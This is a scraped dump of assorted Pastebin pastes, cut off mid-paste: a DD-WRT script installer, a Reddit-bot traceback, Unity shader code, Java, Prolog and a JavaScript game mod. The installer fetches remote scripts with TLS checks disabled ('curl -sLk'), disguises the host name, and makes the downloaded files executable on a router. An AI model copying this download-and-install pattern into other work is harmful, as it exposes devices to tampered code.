id,title,username,language,date,content
e9rj1uTV,ddwrt-installer.sh,hes21,Bash,Saturday 8th of July 2023 12:51:50 AM CDT,"#!/bin/sh
#set -x # uncomment/comment to enable/disable debug mode

#     name: ddwrt-installer.sh
#  version: 3.0.1, 15-aug-2022, by eibgrad
#  purpose: install pastebin script into dd-wrt router

# function usage()
usage() {
    echo 'Usage: ddwrt-installer.sh [options] pastebin-id [ext=sh]'
    echo
    echo '  Install pastebin script into dd-wrt router.'
    echo
    echo '  Installation directory hierarchy:'
    echo '    </path> (from --dir option)'
    echo '    /jffs/etc/config'
    echo '    /tmp'
    echo
    echo '  Options:'
    echo '    --dir PATH  installation directory (created as necessary)'
    echo ""    --pre NUM   add prefix to filename (e.g., '01')""
    echo '    --nocom     remove blank lines and non-functional comments'
    echo '    --comp      same as --nocom, plus remove leading whitespace'
    echo '    --noprompt  silently overwrite files and accept defaults'
    echo '    --debug     install script w/ debugging mode enabled'
    echo '    -h,--help   this usage information'
    echo
    echo '  # e.g., install script w/o comments and w/ bash (sh) extension'
    echo '  ddwrt-installer.sh --nocom MxA19W1M'
    echo
}

# function query( message [default-reply] )
query() {
    local reply

    read -p ""$1 "" reply < /dev/tty
    [ ""$reply"" ] && echo ""$reply"" || echo ""$2""
}

# function is_mounted( mounting-point )
is_mounted() { df | grep -Eq ""[[:space:]]+${1}$""; }

# function customize()
customize() {
    # function _ddwrt_ovpn_split()
    _ddwrt_ovpn_split() {
        local route_up
        local route_down
        local default_vpn

        # function __add_directives()
        __add_directives() {
            local CONFIG='openvpncl_config'
            local TEMPF=""/tmp/ddwrt-installer.$$.tmp""

            # retrieve current openvpn client config
            nvram get $CONFIG | tr -d '\r' > $TEMPF

            # delete any matching/competing directives (active or inactive)
            sed -r \
                -e '/^([[:space:]]|#|;)*(|--)route-up/d' \
                -e '/^([[:space:]]|#|;)*(|--)route-pre-down/d' \
                -e '/^([[:space:]]|#|;)*(|--)pull-filter.*redirect-gateway/d' \
                -e '/^([[:space:]]|#|;)*(|--)redirect-gateway/d' \
                -e '/^([[:space:]]|#|;)*(|--)redirect-private/d' \
                -i $TEMPF

            # delete old banner header and footer
            sed -i '/ added by ddwrt-installer /d' $TEMPF

            # configure default gateway (wan or vpn)
            local com=""$([ ${default_vpn+x} ] && echo '#')""

            # add our directives
            {
            echo '# --- begin directives added by ddwrt-installer --- #'
            echo ""route-up ${route_up}""
            echo ""route-pre-down ${route_down}""
            echo ""${com}pull-filter ignore redirect-gateway""
            echo ""${com}redirect-private def1""
            echo '# ---- end directives added by ddwrt-installer ---- #'
            } >> $TEMPF

            # delete blank lines
            sed -i '/^[[:space:]]*$/d' $TEMPF

            # update openvpn client config
            nvram set $CONFIG=""$(cat $TEMPF | tr -d '\r')""
            nvram commit &>/dev/null

            rm -f $TEMPF
        }

        if [ ! ${noprompt+x} ]; then
            # obtain openvpn default routing preference (default=lan->wan)
            while :; do
                case ""$(query 'Default routing ([1]=lan->wan 2=lan->vpn)?' '1')"" in
                    '1') break;;
                    '2') default_vpn=; break;;
                esac
            done
        fi

        route_up=""$file_dir/route-up""
        route_down=""$file_dir/route-down""

        # add symbolic links
        ln -sf ""$file"" ""$route_up""
        ln -sf ""$file"" ""$route_down""

        __add_directives
    }

    # script-specific customization (optional)
    case ""$pbid"" in
        'nC27ETsp') _ddwrt_ovpn_split;;
        'W2P3TDZT') _ddwrt_ovpn_split;;
        *) ;;
    esac
}

# function exit_1( [message] )
exit_1() { [ ""$1"" ] && echo ""$1""; exit 1; }

# function exit_0( [message] )
exit_0() { [ ""$1"" ] && echo ""$1""; exit 0; }

# handle help/usage requests
for opt; do case $opt in -h|--help) usage; exit 0;; esac; done

# try curl, fallback to wget
which curl &>/dev/null && GET_URL='curl -sLk' || GET_URL='wget -qO -'

# process command line options/arguments
while [ $# -gt 0 ]; do
    case $1 in
             '--dir') shift; file_dir=""${1//[[:space:]]/}"";;
             '--pre') shift; file_pre=""${1//[[:space:]]/}"";;
           '--nocom') nocom=; unset comp;;
            '--comp') comp=; unset nocom;;
        '--noprompt') noprompt=;;
           '--debug') debug=;;
                   *) break 2;;
    esac
    shift
done

# set pastebin-id
[ ""$1"" ] && pbid=""$1"" || exit_0 'info: nothing to do'

# set and verify extension
ext=""$([ ""$2"" ] && echo ""${2//[[:space:]]/}"" || echo sh)""
echo $ext | grep -q '\.' && exit_1 ""error: extension cannot contain '.'""

# construct pastebin url for retrieving raw file (obscure from hosting site)
url=""$(echo wastebin | sed s/w/p/).com/raw/$pbid""

if [ ! ""$file_dir"" ]; then
    # locate storage
    if is_mounted '/jffs'; then
        file_dir='/jffs/etc/config'
    else
        file_dir='/tmp'
        echo 'warning: /jffs not mounted; using /tmp'
    fi
fi

# convert cryptic pastebin id to common name
case ""$pbid"" in
    'hYwdStCx') file='ddwrt-blacklist-domains';;
    'MxA19W1M') file='ddwrt-dhcp-lease-persist';;
    'VDZ32r2D') file='ddwrt-mount-usb-drives';;
    'TKdKUmY1') file='ddwrt-ovpn-client-killswitch';;
    'iNC273ER') file='ddwrt-ovpn-client-watchdog';;
    'gnxtZuqg') file='ddwrt-ovpn-remote-access';;
    'nC27ETsp') file='ddwrt-ovpn-split-advanced';;
    'W2P3TDZT') file='ddwrt-ovpn-split-basic';;
    '9DUMFJgN') file='ddwrt-pptp-policy-based-routing';;
    'NkKUUjsn') file='ddwrt-ultimate-dns-leak-test';;
    'NUb73JqK') file='ddwrt-wol-port-forward';;
    '2gg5ZdRY') file='importvpncl';;
             *) file=""pastebin-$pbid"";;
esac

# check for existing files
efiles=""$(echo $file_dir/*$file*)""

if [ ! ${noprompt+x} ] && [ ""$efiles"" != ""$file_dir/*$file*"" ]; then
    efile_count=0

    for efile in $efiles; do
        echo ""warning: existing file: $efile""
        let efile_count++
    done

    if [ $efile_count -gt 0 ]; then
        # obtain permission to overwrite existing file(s)
        while :; do
            case ""$(query 'Overwrite existing file(s) (yes/[no])?' 'no')"" in
                'yes') break;;
                 'no') exit_0 'info: installation aborted';;
            esac
        done

        # delete existing files
        for efile in $efiles; do rm -f $efile; done
    fi
fi

# option pre: add prefix to filename
[ ""$file_pre"" ] && file=""${file_pre}-$file""

# create directory
if ! mkdir -p ""$file_dir"" 2>/dev/null; then
    exit_1 ""error: cannot create directory: $file_dir""
fi

# construct full path + filename + extension
file=""$file_dir/$file.$ext""

# confirm file can be created through initialization
if ! (> ""$file"") 2>/dev/null; then
    exit_1 ""error: cannot create file: $file""
fi

# retrieve raw file from pastebin
$GET_URL $url | tr -d '\r' > ""$file""; echo >> ""$file""

# verify file is bash script by locating shebang
if ! head -n1 ""$file"" | grep -Eq '^#!/bin/sh($|[[:space:]]+)'; then
    rm -f ""$file""
    exit_1 ""error: file not found: $pbid""
fi

# option nocom: remove blank lines and non-functional comments
[ ${nocom+x} ] && sed -ri '/^[[:space:]]*($|#([[:space:]]|#|$))/d' ""$file""

# option comp: same as --nocom, plus remove leading whitespace
[ ${comp+x}  ] && sed -ri 's/^[[:space:]]*//;/^($|#([[:space:]]|#|$))/d' ""$file""

# option debug: install script w/ debugging mode enabled
[ ${debug+x} ] && sed -ri '2 s/^#(DEBUG=; )/\1/' ""$file""

# mark file executable
chmod +x ""$file""

# check for any script-specific customization
customize

exit_0 ""installed: $file"""
5y2dgL5V,ResponseException: received 504 HTTP response,Vault-TecTradingCo,Python,Saturday 8th of July 2023 12:38:32 AM CDT,"Traceback (most recent call last):
  File ""main.py"", line 57, in wrapper
    job_func(*args, **kwargs)
  File ""main.py"", line 91, in comment_listener
    database_manager.load_comment(comment, db_conn)
  File ""/root/Fallout76MarketplaceKarmaBot/database_manager.py"", line 162, in load_comment
    if not is_mod(comment.author):
  File ""/root/Fallout76MarketplaceKarmaBot/database_manager.py"", line 25, in is_mod
    moderators_list = get_subreddit_instance(""Fallout76Marketplace"").moderator()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/models/reddit/subreddit.py"", line 2960, in __call__
    return self.subreddit._reddit.get(url, params=params)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 595, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 696, in _objectify_request
    self.request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 885, in request
    return self._core.request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 330, in request
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 228, in _request_with_retries
    response, saved_exception = self._make_request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 185, in _make_request
    response = self._rate_limiter.call(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/rate_limit.py"", line 33, in call
    kwargs[""headers""] = set_header_callback()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 283, in _set_header_callback
    self._authorizer.refresh()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 425, in refresh
    self._request_token(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 155, in _request_token
    response = self._authenticator._post(url, **data)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 38, in _post
    raise ResponseException(response)
prawcore.exceptions.ResponseException: received 504 HTTP response
"
URxWkeBX,Crepuscular Rays,noradninja,C#,Saturday 8th of July 2023 12:28:45 AM CDT,"// Upgrade NOTE: replaced 'mul(UNITY_MATRIX_MVP,*)' with 'UnityObjectToClipPos(*)'


Shader ""Lighting/Crepuscular Rays"" {
	
	Properties{
		_MainTex(""Base (RGB)"", 2D) = ""white"" {}
		_BlurTex(""BlurTex (RGB)"", 2D) = ""white"" {}
		_NumSamples(""Number of Samples"", Range(0, 1024)) = 128
		_Density(""Density"", Range(0, 1)) = 1.0
		_Weight(""Weight"", Range(0, 2)) = 1.0
		_Decay(""Decay"", Range(0, 1)) = 1.0
		_Exposure(""Exposure"", Range(0, 1)) = 1.0
		_Parameter(""Kernel Offset"", Range(0, 4)) = 1.0
		_Contrast(""Contrast"", Range(1, 5)) = 1.0
		_PerpendicularFalloff(""Perpendicular Falloff Rate"", Range(0.01, 1)) = 1.0
		_CosAngle(""Angle"", Float) = 1
		[IntRange] _StencilRef (""Stencil Ref"", Range(0,255)) = 0
		_TintColor (""Tint Color"", Color) = (.5, .5, .5, .5)
		_FrameValue(""Frame remainder"", Float) = 0
		[IntRange] _Frequency (""Frequency"", Range(1,15)) = 1
		_fogInfluence(""Fog Influence"", Range(0,2)) = 0.5
		_fogSpeed(""Fog Speed"", Float) = 10.0
	}
		CGINCLUDE
		#include ""UnityCG.cginc""
		#pragma target 2.0

		uniform sampler2D_half _MainTex;
		uniform sampler2D_half _BlurTex;
		uniform sampler2D _CameraDepthTexture;
		half3 _LightPos;
		half _NumSamples;
		half _Density;
		half _Weight;
		half _Decay;
		half _Exposure;
		half _Contrast;
		uniform half4 _Parameter;
		uniform half4 _MainTex_TexelSize;
		half4 _MainTex_ST;
		half _LightY;
		half _CosAngle;
		half4 _TintColor;
		half _PerpendicularFalloff;
		int _Frequency;
		float _fogInfluence;
		half _fogSpeed;
		

		
		struct appdata
		{
			float4 pos : POSITION;
			float2 uv : TEXCOORD0;
		};

		struct v2f 
		{
			float4 pos : SV_POSITION;
			float2 uv  : TEXCOORD0;
		};

		struct v2f_withBlurCoordsSGX 
		{
			float4 pos : SV_POSITION;
			half2 uv : TEXCOORD0;
			half4 offs[3] : TEXCOORD1;
		};

		static const half curve[7] = { 0.0205, 0.0855, 0.232, 0.324, 0.232, 0.0855, 0.0205 };  // gauss'ish blur weights

		half rand(half2 co)
				{
				    const half a = 2.9898f;
				    const half b = 78.233f;
				    const half c = 28.5453f;
				    const half dt = dot(co.xy ,half2(a,b));
				    const half sn = cos(abs(dt/3.14f));
				    return cos(frac(sin(sn) * c)* ((_Time.w * _fogSpeed) * _fogInfluence));
				}	
////////////// accumulator for rays  /////////////////
		v2f vert( appdata v )
			{
				v2f o;
				o.pos = UnityObjectToClipPos (v.pos);
				o.uv = v.uv;
				return o;
			}
			
			
		half4 frag(v2f i) : COLOR
			{
				// Calculate floattor from pixel to light source in screen space.
				half4 light = half4(_LightPos.xyz,1);
				half2 deltaTexCoord = half2 (0,0);
				// get our y direction, and swap the direction the coordinates are plotted based on that
				// so that it looks correct regardless of current camera rotation- we decompose this
				//because it will not look right if we just add or subtract light.xy to i.uv
				deltaTexCoord = half2(light.y < 0.0h ? half2(i.uv.x + light.x, i.uv.y + light.y) : half2(i.uv.x - light.x, i.uv.y - light.y));

				// Divide by number of samples and scale by control factor.
				deltaTexCoord *= 1.0h / _NumSamples * _Density;
				
				// Store initial sample.
				half2 uv = i.uv;
				half3 color = tex2D(_MainTex, uv);
				
				// Set up illumination decay factor.
				half illuminationDecay = 1.0h;
				
				// Evaluate summation from Equation 3 NUM_SAMPLES iterations.
				float depth;
				half rate = _Frequency;
				
				for (int i = 1; i < _NumSamples + 1; i++)
				{
					// Step sample location along ray.
					uv -= deltaTexCoord;
					// Retrieve sample at new location.
					float sample = tex2D(_MainTex, uv);
					half randomFactor = rand(uv.yx)*_fogInfluence * _Contrast;
					float value = frac(i/rate);
					float cast = Linear01Depth(tex2D(_CameraDepthTexture, uv)).r;
					//calc depth value
					depth = float(value !=0 ? float(cast * 1.5f):float(cast * (1-randomFactor)));
					// Apply sample attenuation scale/decay factors.
					sample *= illuminationDecay * (_Weight/ _NumSamples*4) * depth;
					sample *= 2.5h;
					
					// Accumulate combined color.
					color += sample;
					// Update exponential decay factor.
					illuminationDecay *= _Decay;
				}
				// Output final color with a further scale control factor.
				return (max(half4(color * _Exposure, 1), 0.15h));
			}
/////////////// SGX Horizontal Blur /////////////////////////////		
		v2f_withBlurCoordsSGX vertBlurHorizontalSGX (appdata_img v)
			{
				v2f_withBlurCoordsSGX o;
				o.pos = UnityObjectToClipPos(v.vertex);
				
				o.uv = UnityStereoScreenSpaceUVAdjust(v.texcoord.xy, _MainTex_ST);

				const half offsetMagnitude = _MainTex_TexelSize.x * _Parameter.x;
				o.offs[0] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(-3.0h, 0.0h, 3.0h, 0.0h), _MainTex_ST);
				o.offs[1] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(-2.0h, 0.0h, 2.0h, 0.0h), _MainTex_ST);
				o.offs[2] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(-1.0h, 0.0h, 1.0h, 0.0h), _MainTex_ST);

				return o; 
			}
/////////////// SGX Vertical Blur /////////////////////////////		
		v2f_withBlurCoordsSGX vertBlurVerticalSGX (appdata_img v)
			{
				v2f_withBlurCoordsSGX o;
				o.pos = UnityObjectToClipPos(v.vertex);
				
				o.uv = half4(UnityStereoScreenSpaceUVAdjust(v.texcoord.xy, _MainTex_ST),1,1);

				const half offsetMagnitude = _MainTex_TexelSize.y * _Parameter.x;
				o.offs[0] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(0.0h, -3.0h, 0.0h, 3.0h), _MainTex_ST);
				o.offs[1] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(0.0h, -2.0h, 0.0h, 2.0h), _MainTex_ST);
				o.offs[2] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(0.0h, -1.0h, 0.0h, 1.0h), _MainTex_ST);

				return o; 
			}
///////////// SGX Frag  //////////////////////////////////////
		half4 fragBlurSGX ( v2f_withBlurCoordsSGX i ) : SV_Target
			{
				half2 uv = i.uv.xy;
				
				half4 color = tex2D(_MainTex, i.uv) * curve[3];
				
				for( int l = 0; l < 3; l++ )  
				{   
					const half4 tapA = tex2D(_MainTex, i.offs[l].xy);
					const half4 tapB = tex2D(_MainTex, i.offs[l].zw); 
					color += (tapA + tapB) * curve[l];
				}
				return color;
			}
/////////////// Composition /////////////////////////////
		v2f vertFinal(appdata i)
			{
				v2f o = (v2f)0;
				UNITY_INITIALIZE_OUTPUT(v2f, o);
				o.pos = UnityObjectToClipPos(i.pos);
				o.uv = (i.uv);
				return o;
			}
			
		half4 fragFinal(v2f i) : SV_Target
			{
				half4 light = half4(_LightPos.xyz,1);
				_CosAngle = 1- abs(cos(light.z));
				const fixed4 col = tex2D(_MainTex, i.uv);
				fixed4 sample = tex2D(_BlurTex, i.uv);
				const fixed contrast = _Contrast;		
				const fixed4 finalSample = (((col) + (sample * 0.4h)) - 0.5h) * contrast + 0.445h; //final sampled color
				const fixed4 finalColor = (col + (col * 0.04h) - 0.01h); //final modulated base color
				fixed4 blitColor = lerp(finalSample, finalColor, (1 - _CosAngle - _PerpendicularFalloff)); //use falloff to fade effect out when _CosAngle nears 1 to mask artifacts 
				return blitColor;
			}

		//
		v2f vertStencil(appdata v)
		{
				v2f o;
				o.pos = UnityObjectToClipPos (v.pos);
				o.uv = v.uv;
				return o;
		}
		half4 fragStencil (v2f i) : SV_Target
		{
			fixed4 col = _TintColor;
			return col;
		}
		
		ENDCG
	////// Passes /////////////////////////////////////////////////////
	SubShader {
		ZTest Always
		Cull Off
		//0- calculate low resolution rays
		
		Pass { 
				CGPROGRAM
				#pragma vertex vert
				#pragma fragment frag
				#pragma fragmentoption ARB_precision_hint_fastest
				ENDCG
			}
			//2- vertical blur
		Pass {
				CGPROGRAM 
				#pragma vertex vertBlurVerticalSGX
				#pragma fragment fragBlurSGX
				#pragma fragmentoption ARB_precision_hint_fastest
				ENDCG
			}	
			
		//3- horizontal Blur
		Pass {		
				CGPROGRAM	
				#pragma vertex vertBlurHorizontalSGX
				#pragma fragment fragBlurSGX
				#pragma fragmentoption ARB_precision_hint_fastest
				ENDCG
			}
		Pass //4- composition 
		{
        	CGPROGRAM
			#pragma vertex vertFinal
			#pragma fragment fragFinal
			#pragma fragmentoption ARB_precision_hint_fastest
			ENDCG
		}
		Pass { 
		Stencil{
			Ref [_StencilRef]
			Comp Equal
			Pass Keep
		}
				CGPROGRAM
				#pragma vertex vertStencil
				#pragma fragment fragStencil
				#pragma fragmentoption ARB_precision_hint_fastest
				ENDCG
			}
	}
}"
dn0K6ftQ,Paths.get(URI) that adds FileSystems,dutoitns,Java,Saturday 8th of July 2023 12:22:34 AM CDT,"/**
 * Developer notes on {@link FileSystemNotFoundException}:
 * ================================================================================================================
 * {@link FileSystemNotFoundException} will be thrown by {@link Paths#get(URI)} if you are trying to load a resource
 * that is located within a Jar.
 * https://stackoverflow.com/questions/15713119/java-nio-file-path-for-a-classpath-resource
 * 
 * {@link java.nio.file.FileSystem} implements {@link Closeable}.  That said, I am not using it inside a
 * <code>try-with-resource</code> statement because the {@link java.nio.file.FileSystem} is only created once - and
 * then other resources in the same area can be loaded with the same {@link java.nio.file.FileSystem}
 * (ie you don't have to repeatedly create and close {@link java.nio.file.FileSystem}s).
 *
 * Also, closing {@link java.nio.file.FileSystem}s are problematic, because the associated {@link Path} can then
 * no longer be used.
 * ================================================================================================================
 */
private static Path getPathFromUri(URI fileUri) {
	Assert.isNotNull(fileUri);
	
	Path fileOrDirectory = null;
	try {
		fileOrDirectory = Paths.get(fileUri);
	} catch (FileSystemNotFoundException e) {
		// Not sure how threadsafe FileSystems are, so being safe, rather than sorry.
		nfsLock.lock();
		try {
			// Try again, maybe another thread has created the required FileSystem
			fileOrDirectory = Paths.get(fileUri);
		} catch (FileSystemNotFoundException fsnfe) {
			// Other threads have not yet created the required FileSystem
			
			if (logger.isInfoEnabled()) {
				logger.info(""Creating a FileSystem for classpath resource: "" + fileUri);
			}
			
			try {
				FileSystems.newFileSystem(fileUri, Collections.<String, Object>emptyMap());
			} catch (IOException ioe) {
				String errorMessage = ""A problem occurred creating a FileSystem for classpath resource: "" + fileUri;
				throw new RuntimeException(errorMessage, ioe);
			}
			
			// Try again, now that the FileSystem has been created
			fileOrDirectory = Paths.get(fileUri);
		} finally {
			nfsLock.unlock();
		}
	}
	return fileOrDirectory;
}
private final static ReentrantLock nfsLock = new ReentrantLock();; // Lock for creating new FileSystems"
3jrSZ5aE,Crepuscular,noradninja,C#,Saturday 8th of July 2023 12:20:00 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

[RequireComponent(typeof(Camera))]
[AddComponentMenu(""Effects/Crepuscular Rays"", -1)]
public class Crepuscular : MonoBehaviour
{

	public Material material;
	public GameObject mainLight;
	public RenderTexture stencilRT;
	static readonly int blurTexString = Shader.PropertyToID(""_BlurTex"");
	static readonly int cosAngle = Shader.PropertyToID(""_CosAngle"");
	static readonly int frameValue = Shader.PropertyToID(""_FrameValue"");
	[Range(0, 20)]
	public float blurSize = 3;
	[Range(1, 16)]
	public int resolutionDivisor = 1;

	public static readonly int LightPos = Shader.PropertyToID(""_LightPos"");
	public Vector4 lightVector;
	private static readonly int Parameter = Shader.PropertyToID(""_Parameter"");
	public float cosineAngle;

	private int tick;
	// Start is called before the first frame update
	void Start()
    {
      
    }

	void Update()
	{
		if (tick != 3)
		{
			material.SetFloat(frameValue, 1f);
			tick++;
		//print(""Wait frame "" + tick);
		}
		else

		{
			//print(""Depth tick"");
			material.SetFloat(frameValue, 0f);
			tick = 0;
			
		}
	}
	
	//[ImageEffectOpaque]
	private void OnRenderImage(RenderTexture source, RenderTexture destination)
	{
		var blurTex = RenderTexture.GetTemporary(128, 128, 0, source.format);
		//blurTex.filterMode = FilterMode.Point;
		lightVector =GetComponent<Camera>().WorldToViewportPoint(transform.position - mainLight.transform.forward);
		material.SetVector(LightPos, lightVector);
		Graphics.Blit(source, blurTex, material, 0);
		material.SetTexture(blurTexString, blurTex);

		float widthMod = 1.0f / resolutionDivisor;
	if (blurSize > 0){
		for(int i = 0; i < 1; i++) {
                float iterationOffs = (i*1.0f);
                material.SetVector (Parameter, new Vector4 (blurSize * widthMod + iterationOffs, -blurSize * widthMod - iterationOffs, 0.0f, 0.0f));

                // vertical blur
                RenderTexture rt2 = RenderTexture.GetTemporary(128, 128, 0, source.format);
                rt2.filterMode = FilterMode.Bilinear;
                Graphics.Blit (blurTex, rt2, material, 1);
                RenderTexture.ReleaseTemporary (blurTex);
                blurTex = rt2;

                // horizontal blur
                rt2 = RenderTexture.GetTemporary(128, 128, 0, source.format);
                rt2.filterMode = FilterMode.Bilinear;
                Graphics.Blit (blurTex, rt2, material, 2);
                RenderTexture.ReleaseTemporary (blurTex);
                blurTex = rt2;
		}
	}
		RenderTexture.ReleaseTemporary(blurTex);
		Graphics.Blit(source, destination, material, 3);
	}
}"
WzNVkBhK,Arguments not Instantiated in Calculating RSI,KDLPro,Prolog,Friday 7th of July 2023 11:51:43 PM CDT,"% Goals:
% 1. Implement MACD
% 2. Use 9-day EMA as signal line
% 3. Use RSI.
:- dynamic open_value/1.
:- dynamic close_value/1.
:- dynamic prev_close/1.
:- dynamic ema_9/1.
:- dynamic ema_12/1.
:- dynamic ema_26/1.
:- dynamic total_gain/1.
:- dynamic total_loss/1.
:- dynamic num_candles/1.
:- dynamic isa/2.
:- dynamic macd/1.
:- dynamic trend_is/1.

:- use_module(library(csv)).

read_15m_candles:-
    read_csv_file(""15-min candlesticks.csv"", Rows).

read_csv_file(File, Rows):-
    csv_read_file(File, Rows, [functor(row)]),
    reset,
    process_rows(Rows).

reset:-
    retractall(close_value(_)),
    retractall(open_value(_)),
    assert(close_value(0)),
    assert(open_value(0)),
    retractall(total_gain(_)),
    retractall(total_loss(_)),
    assert(total_gain(0)),
    assert(total_loss(0)),
    retractall(macd(_)),
    init_calculate_ema.

init_calculate_ema:-
    retractall(ema_9(_)),
    asserta(ema_9(0)),
    retractall(ema_12(_)),
    asserta(ema_12(0)),
    retractall(ema_26(_)),
    asserta(ema_26(0)).

process_rows([]):-
    open_value(Open),
    close_value(Close),
    check_candlestick(Open, Close),
    write('done'), nl.
process_rows([Row|Rows]):-
    Row = row(O_val, _, _, C_val),
    retractall(prev_close(_)),
    retract(close_value(Prev_C)),
    retract(open_value(_)),
    assert(prev_close(Prev_C)),
    assert(close_value(C_val)),
    assert(open_value(O_val)),
    check_gain_or_loss,
    add_next_ema(9, C_val),
    add_next_ema(12, C_val),
    add_next_ema(26, C_val),
    add_macd,
    check_trend,
    process_rows(Rows).

check_gain_or_loss:-				
% this is where le error is
    prev_close(Prev_Close),
    close_value(Curr_Close),
    (Prev_Close > Curr_Close ->
        write('more'));
    (Prev_Close < Curr_Close ->
        write('less'));
    (Prev_Close = Curr_Close ->
        write('else')).


add_next_ema(Period, Close):-
    (Period = 9 ->
        retract(ema_9(Prev_Close)),
        M is 2/10,
        Prev_M is 1 - M,
        Prev_Weight is Prev_Close * Prev_M,
        Curr_Weight is Close * M,
        Curr_EMA is Prev_Weight + Curr_Weight,
        asserta(ema_9(Curr_EMA)));
    (Period = 12 ->
        retract(ema_12(Prev_Close)),
        M is 2/13,
        Prev_M is 1 - M,
        Prev_Weight is Prev_Close * Prev_M,
        Curr_Weight is Close * M,
        Curr_EMA is Prev_Weight + Curr_Weight,
        asserta(ema_12(Curr_EMA)));
    (Period = 26 ->
        retract(ema_26(Prev_Close)),
        M is 2/27,
        Prev_M is 1 - M,
        Prev_Weight is Prev_Close * Prev_M,
        Curr_Weight is Close * M,
        Curr_EMA is Prev_Weight + Curr_Weight,
        asserta(ema_26(Curr_EMA)));
    !.

add_macd:-
    ema_12(EMA_12_val),
    ema_26(EMA_26_val),
    MACD is EMA_12_val - EMA_26_val,
    asserta(macd(MACD)).

check_trend:-
    retract(trend_is(Curr_Trend)),
    macd(MACD),
    ema_9(Signal),
    (MACD > Signal, Curr_Trend = bearish ->
        assert(trend_is(going_bullish));
    MACD > Signal ->
        assert(trend_is(bullish));
    MACD < Signal, Curr_Trend = bullish ->
        assert(trend_is(going_bearish));
    MACD < Signal -> 
        assert(trend_is(bearish))).
check_trend:-
    macd(MACD),
    ema_9(Signal),
    (MACD > Signal ->
        assert(trend_is(bullish));
    MACD < Signal -> 
        assert(trend_is(bearish))).

check_candlestick(Open, Close) :-
    retractall(isa(_, _)),
    ( Open < Close -> asserta(isa(candlestick, green))
    ; Open > Close -> asserta(isa(candlestick, red))
    ; Open is Close -> asserta(isa(candlestick, neutral)))."
j66B83SA,Como Verificar Si Una Variable Tiene un Número,NubeColectiva,Python,Friday 7th of July 2023 11:27:46 PM CDT,"numero1 = 250
numero2 = 3.14
numero3 = 12,000.45

print(isinstance(numero2, float))
# True "
cfN9KFAc,"game.mods.sophie.smartBuild(""field"")",sinkir,JavaScript,Friday 7th of July 2023 11:24:53 PM CDT,"if(!game.mods)
{
	game.mods = {};
}
if(!game.mods.sophie)
{
	game.mods.sophie = {};
}


game.mods.sophie.genMyBuildFunction = function ()
{
	var sFunc = game.time.queue.update.toString();
	var asFunc = sFunc.split(""\n"");

	var bFlag_el = false;
	var bFlag_controller = false;
	var sParsed = """";
	for(var i=1;i<asFunc.length;i++)
	{
		if(bFlag_el)
		{
			if(bFlag_controller)
			{
				
			}
			else
			{
				if(asFunc[i].includes(""if(!props.controller){""))
				{
					bFlag_controller = true;
				}
				else
				{
					if(asFunc[i].includes(`""invalid queue item:""`))
					{
						sParsed += asFunc[i].replace(`""invalid queue item:""`,
						`""invalid myBuild item:""`)+""\n"";
					}
					else if(asFunc[i].includes(`props.controller.build(model, 1);`))
					{
						sParsed += asFunc[i].replace(`props.controller.build(model, 1);`,
						`props.controller.build(model, el.value);`)+""\n"";
					}
					else
					{
						sParsed += asFunc[i].replace(`this.game`, `game`)+""\n"";
					}
				}
			}
		}
		else
		{
			if(asFunc[i].includes(""var el = this.queueItems[0];""))
			{
				bFlag_el = true;
			}		
		}
	}


	var sPreText = `
	game.mods.sophie.myBuild = function(sElName, sElType, iValue = 1){
			if(iValue > 1 && game.time.queue.queueNonStackable.includes(sElType) || iValue < 1)
			{
				iValue = 1;
			}
			var el = {""name"":sElName, ""type"":sElType, ""value"":iValue};
	`;


	var sPostText = `
	        if(!props.controller){
				console.error(el.name + "" of "" + el.type + "" no controller found :o"");
				return false;
			}
			if(buyItem){
				props.controller.buyItem(model, el.value,  function(result) {});
			}
			
			
			var changed = false;
			if (Array.isArray(compare)){
				for (var i in compare){
					if (oldVal[compare[i]] != model.metadata[compare[i]]){
						changed = true;
					}
				}
			}else{
				changed = oldVal != model.metadata[compare];
			}
			
			return changed;
	}
	`;

	var sFinalText = sPreText+sParsed+sPostText;
	eval(sFinalText);
}

game.mods.sophie.fillPossibleValues = function ()
{
		
	for(var i=0;i<game.time.queue.queueSourcesArr.length;i++)
	{
		var possibleValues = false;
		switch (game.time.queue.queueSourcesArr[i].name){
			case ""policies"":
				possibleValues = game.managers[3].meta[1].meta.map(arr => arr.name);
				break;
				
			case ""tech"":
				possibleValues = game.managers[3].meta[0].meta.map(arr => arr.name);
				break;

			case ""buildings"":
				possibleValues = game.managers[2].meta[0].meta.map(arr => arr.name);
				break;

			case ""spaceMission"":
				possibleValues = game.managers[6].meta[0].meta.map(arr => arr.name);
				
				break;

			case ""spaceBuilding"":
				possibleValues = game.managers[6].meta[1].meta.map(arr => arr.name);
				
				possibleValues = possibleValues.concat(game.managers[6].meta[2].meta.map(arr => arr.name));
